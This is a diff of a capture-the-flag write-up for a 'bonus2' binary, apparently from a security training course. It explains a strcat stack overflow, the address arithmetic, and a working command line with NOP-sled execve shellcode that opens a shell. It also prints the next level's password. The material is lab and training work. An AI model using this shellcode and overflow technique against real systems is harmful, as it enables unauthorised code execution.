@@ -21,13 +21,25 @@ solution bonus2:
 -> since "buff" can go up to 72 bytes, it is possible to overflow "str" with the strcat method and reach the return address of greetuser stored on the stack
 to achieve this, we have to write into str[76] (72 bytes + saved ebp (4 bytes))
 
--> we are going to set "LANG" to "fi", so that "str" contains 18 bytes already, which means we only have to add 58 bytes to reach the return address
+-> we are going to set "LANG" to "nl", so that "str" contains 13 bytes already, which means we only have to add 63 bytes to reach the return address
 
--> the first 40 bytes of "buff" copied from argv[1] will contain a NOP sled and a shellcode, while the 22 bytes copied from argv[2] will contain the address of redirection, which will point to somewhere inside the NOP sled
-(the stack in the main usually starts higher outside of gdb because gdb's arguments and environment are bigger)
-when LANG is set to "fi", and argv[1] is 40 bytes, and argv[2] is 22 bytes, main's esp is 0xbfffe600
-we have a pool of 15 NOP at the start of our buffer, (the shellcode is 25 bytes) so we will point to main's esp plus 14 bytes : 0xbfffe60e
+-> the first 40 bytes of "buff" copied from argv[1] will contain a NOP sled of 19 bytes and a shellcode of 21 bytes, while the 27 bytes copied from argv[2] will contain the address of redirection, which will point to somewhere inside the NOP sled
+It is important to note that the stack usually starts higher outside of gdb because gdb's arguments and environment are bigger
+by trial and error we find that there is a 32 byte difference between addresses in gdb and addresses outside gdb
 
-> LANG=fi ./bonus2 `python -c "print('\x90' * 15 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')"` `python -c "print('B' * 18 + '\x0e\xf6\xff\xbf')"`
+The shellcode exists in 3 different places: in "buff", at main's esp ("buff" is copied before the call to greetuser), and in "str"
+when LANG is set to "nl", and argv[1] is 40 bytes, and argv[2] is 27 bytes, main's esp is 0xbffff600, "buff" is at 0xbffff650, and "str" is at 0xbffff5b0
+
+-> So the payload address can be :
+- address of "str" + 13 bytes ("Goedemiddag! ") + 9 bytes (middle of NOP-sled) + 32 bytes (gdb diff) :
+0xbffff5b0 + 13 + 9 + 32 = 0xbffff5e6
+
+- main's esp + 9 bytes + 32 bytes :
+0xbffff600 + 9 + 32 = 0xbffff629
+
+- address of "buff" + 9 bytes + 32 bytes :
+0xbffff650 + 9 + 32 = 0xbffff679
+
+> LANG=nl ./bonus2 `python -c "print('\x90' * 19 + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80')"` `python -c "print('B' * 23 + '\xe6\xf5\xff\xbf')"`
 $ cat /home/user/bonus3/.pass
 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
